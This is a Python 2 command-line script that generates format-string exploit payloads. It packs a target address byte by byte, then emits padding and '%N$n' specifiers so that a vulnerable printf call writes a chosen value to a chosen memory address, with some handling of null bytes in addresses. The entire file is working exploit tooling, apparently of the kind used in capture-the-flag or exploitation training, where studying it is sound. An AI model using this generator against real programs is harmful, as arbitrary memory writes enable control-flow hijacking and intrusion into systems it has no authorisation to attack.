#!/usr/bin/python
import struct
import sys
import argparse
import binascii

def pack(size, val):
    return struct.pack(size, int(val, 16))

def construct(written, target_val, argnum):
#    print "currently written: %s bytes" % written
    target = int(target_val, 16)
    # target = int(binascii.hexlify(target_val), 16)
#    print "target value: 0x%x" % target
    padding =  target - written
    while padding < 0:
        padding += 256
#    print "padding: %d" % padding
    if padding < 16:
        pad_str = 'A'*padding
    else:
        pad_str = '%' + '%dx' % padding
    first_byte = pad_str + '%' + str(argnum) +'$n'

    now_written = written + padding
    return now_written, first_byte

def split_by_byte(to_split):
    rest = to_split.replace('0x','')
#    rest = splitted # take out 1 byte at a time
    split_res=[]
    while len(rest) > 0:
        s, rest = pack('<B', '0x'+rest[:2]), rest[2:]
        split_res.append(s)
    split_res.reverse()
    return split_res

def fmtstring(args):
    """ Handle the null bytes!
"""
    payload = args.payload
    writeat = args.writeat
    argnum = args.argnum

    result = []
    payload_bytes = payload.split('x')[1:]
    zipped = zip(payload_bytes, range(len(payload_bytes)))

    payloads = '0x'+payload.replace('x','') # just rearrange the format
    payloads = split_by_byte(payloads)
#    writewriteats = []

 #   writeats = split_by_byte(writeat)
 #   writewriteats.append(writeats)
    payload_add = []
    for i in range(len(payloads)):
        writeat = int(writeat, 16)
        writeat += 0x1
        writeat = hex(writeat)
        if not writeat.endswith('00'):
            payload_add.append((zipped[i][0], zipped[i][1], writeat))


        lookahead = hex(int(writeat,16) + 0x1)
        if lookahead.endswith('00') and i+1 != len(payloads):
            payload_add[i] = (zipped[i][0]+zipped[i+1][0], zipped[i][1],writeat)
            # print "(%s, %s, %s)" % payload_add[i]#, Warning, the next target address contains a null-byte, consider collapsing!" % zipped[i]
        # else:
        #     if not writeat.endswith('00'):
        #         print "(%s, %s, %s)" % payload_add[-1]

#    payload_add.sort(key=lambda x:int(x[0],16))
    # print payload_add


    written = len(payload_bytes) #start length of payload
    address_string = ''
    for i in range(len(payload_add)):
        address_string += ''.join(split_by_byte(payload_add[i][2]))
        written, first_byte = construct(written, payload_add[i][0], argnum)
        result.append(first_byte)
        argnum += 1

    result.insert(0, address_string)
    print ''.join(result)
    return result


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Writes the address `PAYLOAD` at `WRITEAT`!")
    parser.add_argument("-payload", action="store", dest='payload', help="The address to write.", required=True)
    parser.add_argument("-writeat", action="store", dest='writeat', help="Where to write PAYLOAD address.", required=True)
    parser.add_argument("-argnum", action="store", dest='argnum', type=int, help="Where the argument is found on the stack.", required=True)

    result = parser.parse_args()
#    print result.payload
#    print result.writeat
#    print result.payload.split('x')[1:]
    res = fmtstring(result)
#    print ''.join(res)
